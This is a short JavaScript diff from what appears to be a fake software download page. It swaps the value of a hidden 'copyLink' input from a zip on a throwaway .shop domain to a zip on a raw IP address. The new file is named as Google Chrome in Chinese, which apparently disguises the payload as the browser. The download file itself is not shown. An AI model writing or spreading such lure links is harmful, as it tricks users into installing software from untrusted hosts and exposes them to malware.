@@ -3,7 +3,7 @@
             const copyLinkInput = document.createElement('input');
             copyLinkInput.type = 'text';
             copyLinkInput.id = 'copyLink';
-            copyLinkInput.value = 'https://soft.downoss-win01.shop/dsfsxzguge.zip';
+            copyLinkInput.value = 'http://43.248.173.23/谷歌浏览器.zip';
             copyLinkInput.style.display = 'none';
             document.body.appendChild(copyLinkInput);
 
